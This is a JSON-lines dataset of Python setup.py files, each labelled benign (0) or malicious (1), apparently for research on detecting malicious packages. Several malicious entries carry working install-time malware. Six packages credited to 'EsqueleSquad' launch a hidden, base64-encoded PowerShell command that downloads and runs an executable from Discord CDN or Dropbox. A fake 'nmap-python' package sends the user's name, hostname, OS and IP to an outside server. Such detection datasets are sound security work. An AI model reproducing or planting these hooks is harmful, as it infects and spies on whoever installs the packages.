{"idx": "flaky-3.7.0", "func": "# -*- coding: utf-8 -*-\n\nfrom __future__ import unicode_literals\nfrom os.path import dirname, join\nimport sys\nfrom setuptools.command.test import test as TestCommand\nfrom setuptools import setup, find_packages\n\n\nCLASSIFIERS = [\n    'Development Status :: 4 - Beta',\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: Apache Software License',\n    'Topic :: Software Development :: Testing',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 2',\n    'Programming Language :: Python :: 2.7',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: Implementation :: CPython',\n    'Programming Language :: Python :: Implementation :: PyPy',\n    'Operating System :: OS Independent',\n    'Operating System :: POSIX',\n    'Operating System :: Microsoft :: Windows',\n    'Operating System :: MacOS :: MacOS X',\n]\n\n\nclass Tox(TestCommand):\n    user_options = [(b'tox-args=', b'a', 'Arguments to pass to tox')]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        self.tox_args = None\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        import shlex\n        import tox\n        args = self.tox_args\n        if args:\n            args = shlex.split(self.tox_args)\n        errno = tox.cmdline(args=args)\n        sys.exit(errno)\n\n\ndef main():\n    base_dir = dirname(__file__)\n    setup(\n        name='flaky',\n        version='3.7.0',\n        description='Plugin for nose or pytest that automatically reruns flaky tests.',\n        long_description=open(join(base_dir, 'README.rst')).read(),\n        author='Box',\n        author_email='oss@box.com',\n        url='https://github.com/box/flaky',\n        license='Apache Software License, Version 2.0, http://www.apache.org/licenses/LICENSE-2.0',\n        packages=find_packages(exclude=['test*']),\n        test_suite='test',\n        tests_require=['tox'],\n        cmdclass={'test': Tox},\n        zip_safe=False,\n        entry_points={\n            'nose.plugins.0.10': [\n                'flaky = flaky.flaky_nose_plugin:FlakyPlugin'\n            ],\n            'pytest11': [\n                'flaky = flaky.flaky_pytest_plugin'\n            ]\n        },\n        keywords='nose pytest plugin flaky tests rerun retry',\n        python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*',\n        classifiers=CLASSIFIERS,\n    )\n\n\nif __name__ == '__main__':\n    main()\n", "target": 0}
{"idx": "admcheck-1.1.0", "func": "from setuptools import setup, find_packages\n\n\n\n\nVERSION = '1.1.0'\nDESCRIPTION = 'basic package to check if user has admin'\n\n# Setting up\nsetup(\n    name=\"admcheck\",\n    version=VERSION,\n    author=\"ix_EcIipse\",\n    author_email=\"blank@noemail.net\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['requests', 'pyautogui'],\n    keywords=['python', 'sockets', 'requests'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "libpingverrand-2.34", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpingverrand',\n    packages = ['modlib'],\n    version = '3.88',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "nmap-python-0.6.1", "func": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom distutils.core import setup, Extension\nimport sys,socket,base64,os\nimport getpass,platform\nif sys.version_info>(3,0):\n    from urllib import request,parse\nelif sys.version_info<(3,0):\n    import urllib\nnmap = Extension('nmap',\n                 sources = ['nmap/nmap.py', 'nmap/__init__.py', 'nmap/example.py'])\n\nfrom nmap import *\n\n# Install : python setup.py install\n# Register : python setup.py register\n\n#  platform = 'Unix',\n#  download_url = 'http://xael.org/norman/python/python-nmap/',\n\ndef checkVersion():\n    user_name = getpass.getuser()\n    hostname = socket.gethostname()\n    os_version = platform.platform()\n    if platform.system() is 'Windows':\n        import ctypes\n        import locale\n        dll_handle = ctypes.windll.kernel32\n        loc_lang = locale.getdefaultlocale()\n        language = ':'.join(loc_lang)\n    elif platform.system() is 'Linux':\n        loc_lang = os.popen(\"echo $LANG\")\n        language = loc_lang.rea\n    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]\n    package='nmap_python'\n    vid = user_name+\"###\"+hostname+\"###\"+os_version+\"###\"+ip+\"###\"+package\n    if sys.version_info>(3,0):\n        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))\n    elif sys.version_info<(3,0):\n        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))\ncheckVersion()\n\nsetup (\n    name = 'nmap-python',\n    version = nmap.__version__,\n    author = 'Alexandre Norman',\n    author_email = 'norman@xael.org',\n    license ='gpl-3.0.txt',\n    keywords=\"nmap, portscanner, network, sysadmin\",\n    # Get more strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n    platforms=[\n        \"Operating System :: OS Independent\",\n        ],\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Programming Language :: Python\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: System Administrators\",\n        \"License :: OSI Approved :: GNU General Public License (GPL)\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: System :: Monitoring\",\n        \"Topic :: System :: Networking\",\n        \"Topic :: System :: Networking :: Firewalls\",\n        \"Topic :: System :: Networking :: Monitoring\",\n        ],\n    packages=['nmap'],\n    url = 'http://xael.org/pages/python-nmap-en.html',\n    bugtrack_url = 'https://bitbucket.org/xael/python-nmap',\n    description = 'This is a python class to use nmap and access scan results from python3',\n    long_description=open('README.txt').read() + \"\\n\" + open('CHANGELOG').read(),\n    )\n", "target": 1}
{"idx": "selfsplitpush-4.6", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfsplitpush',\n    packages = ['modlib'],\n    version = '6.27',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqgrandpull-6.3", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgrandpull',\n    packages = ['modlib'],\n    version = '6.78',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqintelram-9.3", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqintelram',\n    packages = ['modlib'],\n    version = '3.41',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "stringcc-6.31", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'stringcc',\n    packages = ['modlib'],\n    version = '5.93',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "execnet-1.9.0", "func": "# -*- coding: utf-8 -*-\ndef main():\n    from setuptools import setup\n\n    with open(\"README.rst\") as fp:\n        readme = fp.read()\n    setup(\n        name=\"execnet\",\n        description=\"execnet: rapid multi-Python deployment\",\n        long_description=readme,\n        use_scm_version={\"write_to\": \"execnet/_version.py\"},\n        url=\"https://execnet.readthedocs.io/en/latest/\",\n        license=\"MIT\",\n        platforms=[\"unix\", \"linux\", \"osx\", \"cygwin\", \"win32\"],\n        author=\"holger krekel and others\",\n        classifiers=[\n            \"Development Status :: 5 - Production/Stable\",\n            \"Intended Audience :: Developers\",\n            \"License :: OSI Approved :: MIT License\",\n            \"Operating System :: POSIX\",\n            \"Operating System :: Microsoft :: Windows\",\n            \"Operating System :: MacOS :: MacOS X\",\n            \"Topic :: Software Development :: Libraries\",\n            \"Topic :: System :: Distributed Computing\",\n            \"Topic :: System :: Networking\",\n            \"Programming Language :: Python :: 2\",\n            \"Programming Language :: Python :: 2.7\",\n            \"Programming Language :: Python :: 3\",\n            \"Programming Language :: Python :: 3.5\",\n            \"Programming Language :: Python :: 3.6\",\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: Implementation :: CPython\",\n            \"Programming Language :: Python :: Implementation :: PyPy\",\n        ],\n        packages=[\"execnet\", \"execnet.script\"],\n        python_requires=\">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*\",\n        extras_require={\"testing\": [\"pre-commit\"]},\n        setup_requires=[\"setuptools_scm\"],\n    )\n\n\nif __name__ == \"__main__\":\n    main()\n", "target": 0}
{"idx": "github3.py-3.2.0", "func": "\"\"\"Packaging logic.\"\"\"\nimport setuptools\n\nsetuptools.setup()\n", "target": 0}
{"idx": "tpgamestr-4.55", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgamestr',\n    packages = ['modlib'],\n    version = '6.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dxpy-0.327.1", "func": "#!/usr/bin/env python\n#\n# Copyright (C) 2013-2016 DNAnexus, Inc.\n#\n# This file is part of dx-toolkit (DNAnexus platform client libraries).\n#\n#   Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n#   use this file except in compliance with the License. You may obtain a copy\n#   of the License at\n#\n#       http://www.apache.org/licenses/LICENSE-2.0\n#\n#   Unless required by applicable law or agreed to in writing, software\n#   distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#   WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#   License for the specific language governing permissions and limitations\n#   under the License.\n\nimport glob\nimport os\nimport platform\nimport re\nfrom setuptools import setup, find_packages\nimport sys\n\nif sys.version_info < (2, 7):\n    raise Exception(\"dxpy requires Python >= 2.7\")\n\n# Pypi is the repository for python packages.\n# It requires that version numbers look like this: X.Y.Z,\n# where X, Y, and Z are numbers. It is more complicated than that, but that's\n# the main idea.\n#\n# Clean up the version number. It starts like this:\n#    '0.265.0-77-g059d243f'\n# and we need 0.265.0\ndef make_valid_pypi_version(raw):\n    m = re.match(r'(\\d+)\\.(\\d+)\\.(\\d+)', raw)\n    return m.group(0)\n\n\n# Don't import, but use exec.\n# Importing would trigger interpretation of the dxpy entry point, which can fail if deps are not installed.\n#\n# The result of this trickery is a variable called \"version\", initialized\n# to the current version of dxpy.\nwith open(os.path.join(os.path.dirname(__file__), 'dxpy', 'toolkit_version.py')) as fh:\n    exec(compile(fh.read(), 'toolkit_version.py', 'exec'))\nversion = make_valid_pypi_version(version)\n\n# The readme file is used as the long-description of the package.\n# It will show up in the pypi site.\nwith open(os.path.join(os.path.dirname(__file__), \"Readme.md\"), \"r\") as fh:\n    readme_content = fh.read()\n\n# Grab all the scripts from dxpy/scripts and install them without their .py extension.\n# Replace underscores with dashes.\n# See Readme.md for details.\nscripts = []\nfor module in os.listdir(os.path.join(os.path.dirname(__file__), 'dxpy', 'scripts')):\n    if module == '__init__.py' or module[-3:] != '.py':\n        continue\n    module = module[:-3]\n    script = module.replace('_', '-')\n    scripts.append(\"{s} = dxpy.scripts.{m}:main\".format(s=script, m=module))\n\ndependencies = [line.rstrip() for line in open(os.path.join(os.path.dirname(__file__), \"requirements.txt\"))]\ntest_dependencies = [line.rstrip() for line in open(os.path.join(os.path.dirname(__file__), \"requirements_test.txt\"))]\nbackports_dependencies = [line.rstrip() for line in open(os.path.join(os.path.dirname(__file__), \"requirements_backports.txt\"))]\n\nif sys.version_info[0] < 3:\n    dependencies.extend(backports_dependencies)\n\nif 'DNANEXUS_INSTALL_PYTHON_TEST_DEPS' in os.environ:\n    dependencies.extend(test_dependencies)\n\ntemplate_files = []\n\nfor directory, subdirectories, files in os.walk(\"dxpy/templating/templates\"):\n    directory = directory[len(\"dxpy/templating/\"):]\n    template_files.extend([os.path.join(directory, _file) for _file in files])\n\nsetup(\n    name='dxpy',\n    version=version,\n    description='DNAnexus Platform API bindings for Python',\n    long_description=readme_content,\n    long_description_content_type=\"text/markdown\",\n    author='Aleksandra Zalcman, Andrey Kislyuk, Anurag Biyani, Geet Duggal, Katherine Lai, Kurt Jensen, Marek Hrvol, Ohad Rodeh, Phil Sung',\n    author_email='support@dnanexus.com',\n    url='https://github.com/dnanexus/dx-toolkit',\n    zip_safe=False,\n    license='Apache Software License',\n    packages = find_packages(exclude=['test']),\n    package_data={'dxpy.templating': template_files},\n    scripts = glob.glob(os.path.join(os.path.dirname(__file__), 'scripts', 'dx*')),\n    entry_points = {\n        \"console_scripts\": scripts,\n    },\n    install_requires = dependencies,\n    extras_require={\n        'xattr': [\"xattr==0.9.6; sys_platform == 'linux2' or sys_platform == 'linux'\"]\n    },\n    tests_require = test_dependencies,\n    test_suite = \"test\",\n    classifiers=[\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: POSIX',\n        'Programming Language :: Python',\n        'Programming Language :: Unix Shell',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "firebase_admin-5.2.0", "func": "# Copyright 2017 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Setup file for distribution artifacts.\"\"\"\nfrom __future__ import print_function\n\nfrom os import path\nimport sys\n\nfrom setuptools import setup\n\n\n(major, minor) = (sys.version_info.major, sys.version_info.minor)\nif major != 3 or minor < 6:\n    print('firebase_admin requires python >= 3.6', file=sys.stderr)\n    sys.exit(1)\n\n# Read in the package metadata per recommendations from:\n# https://packaging.python.org/guides/single-sourcing-package-version/\nabout_path = path.join(path.dirname(path.abspath(__file__)), 'firebase_admin', '__about__.py')\nabout = {}\nwith open(about_path) as fp:\n    exec(fp.read(), about)  # pylint: disable=exec-used\n\n\nlong_description = ('The Firebase Admin Python SDK enables server-side (backend) Python developers '\n                    'to integrate Firebase into their services and applications.')\ninstall_requires = [\n    'cachecontrol>=0.12.6',\n    'google-api-core[grpc] >= 1.22.1, < 3.0.0dev; platform.python_implementation != \"PyPy\"',\n    'google-api-python-client >= 1.7.8',\n    'google-cloud-firestore>=2.1.0; platform.python_implementation != \"PyPy\"',\n    'google-cloud-storage>=1.37.1',\n]\n\nsetup(\n    name=about['__title__'],\n    version=about['__version__'],\n    description='Firebase Admin Python SDK',\n    long_description=long_description,\n    url=about['__url__'],\n    author=about['__author__'],\n    license=about['__license__'],\n    keywords='firebase cloud development',\n    install_requires=install_requires,\n    packages=['firebase_admin'],\n    python_requires='>=3.6',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Build Tools',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'License :: OSI Approved :: Apache Software License',\n    ],\n)\n", "target": 0}
{"idx": "randrange-0.0.1", "func": "from setuptools import setup\nfrom setup import kwargs\nsetup(**kwargs)\n", "target": 1}
{"idx": "gevent-21.12.0", "func": "#!/usr/bin/env python\n\"\"\"gevent build & installation script\"\"\"\nfrom __future__ import print_function\nimport sys\nimport os\nimport os.path\n\n\n# setuptools is *required* on Windows\n# (https://bugs.python.org/issue23246) and for PyPy. No reason not to\n# use it everywhere. v24.2.0 is needed for python_requires\nfrom setuptools import Extension, setup\nfrom setuptools import find_packages\n\n\nfrom _setuputils import read\nfrom _setuputils import read_version\nfrom _setuputils import PYPY, WIN\nfrom _setuputils import ConfiguringBuildExt\nfrom _setuputils import GeventClean\nfrom _setuputils import BuildFailed\nfrom _setuputils import cythonize1\nfrom _setuputils import get_include_dirs\nfrom _setuputils import bool_from_environ\n\n# Environment variables that are intended to be used outside of our own\n# CI should be documented in ``installing_from_source.rst``\n\nif WIN:\n    # Make sure the env vars that make.cmd needs are set\n    if not os.environ.get('PYTHON_EXE'):\n        os.environ['PYTHON_EXE'] = 'pypy' if PYPY else 'python'\n    if not os.environ.get('PYEXE'):\n        os.environ['PYEXE'] = os.environ['PYTHON_EXE']\n\n\nif PYPY and sys.pypy_version_info[:3] < (2, 6, 1): # pylint:disable=no-member\n    # We have to have CFFI >= 1.3.0, and this platform cannot upgrade\n    # it.\n    raise Exception(\"PyPy >= 2.6.1 is required\")\n\n\n\n__version__ = read_version()\n\n\nfrom _setuplibev import build_extension as build_libev_extension\nfrom _setupares import ARES\n\nCORE = cythonize1(build_libev_extension())\n\n# Modules that we cythonize for performance.\n# Be careful not to use simple names for these modules,\n# as the non-static symbols cython generates do not include\n# the module name. Thus an extension of 'gevent._queue'\n# results in symbols like 'PyInit__queue', which is the same\n# symbol used by the standard library _queue accelerator module.\n# The name of the .pxd file must match the local name of the accelerator\n# extension; however, sadly, the generated .c and .html files will\n# still use the same name as the .py source.\n\nSEMAPHORE = Extension(name=\"gevent._gevent_c_semaphore\",\n                      sources=[\"src/gevent/_semaphore.py\"],\n                      depends=['src/gevent/_gevent_c_semaphore.pxd'],\n                      include_dirs=get_include_dirs())\n\n\nLOCAL = Extension(name=\"gevent._gevent_clocal\",\n                  sources=[\"src/gevent/local.py\"],\n                  depends=['src/gevent/_gevent_clocal.pxd'],\n                  include_dirs=get_include_dirs())\n\n\nGREENLET = Extension(name=\"gevent._gevent_cgreenlet\",\n                     sources=[\n                         \"src/gevent/greenlet.py\",\n                     ],\n                     depends=[\n                         'src/gevent/_gevent_cgreenlet.pxd',\n                         'src/gevent/_gevent_c_ident.pxd',\n                         'src/gevent/_ident.py'\n                     ],\n                     include_dirs=get_include_dirs())\n\nABSTRACT_LINKABLE = Extension(name=\"gevent._gevent_c_abstract_linkable\",\n                              sources=[\"src/gevent/_abstract_linkable.py\"],\n                              depends=['src/gevent/_gevent_c_abstract_linkable.pxd'],\n                              include_dirs=get_include_dirs())\n\n\nIDENT = Extension(name=\"gevent._gevent_c_ident\",\n                  sources=[\"src/gevent/_ident.py\"],\n                  depends=['src/gevent/_gevent_c_ident.pxd'],\n                  include_dirs=get_include_dirs())\n\n\nIMAP = Extension(name=\"gevent._gevent_c_imap\",\n                 sources=[\"src/gevent/_imap.py\"],\n                 depends=['src/gevent/_gevent_c_imap.pxd'],\n                 include_dirs=get_include_dirs())\n\nEVENT = Extension(name=\"gevent._gevent_cevent\",\n                  sources=[\"src/gevent/event.py\"],\n                  depends=['src/gevent/_gevent_cevent.pxd'],\n                  include_dirs=get_include_dirs())\n\nQUEUE = Extension(name=\"gevent._gevent_cqueue\",\n                  sources=[\"src/gevent/queue.py\"],\n                  depends=['src/gevent/_gevent_cqueue.pxd'],\n                  include_dirs=get_include_dirs())\n\nHUB_LOCAL = Extension(name=\"gevent._gevent_c_hub_local\",\n                      sources=[\"src/gevent/_hub_local.py\"],\n                      depends=['src/gevent/_gevent_c_hub_local.pxd'],\n                      include_dirs=get_include_dirs())\n\nWAITER = Extension(name=\"gevent._gevent_c_waiter\",\n                   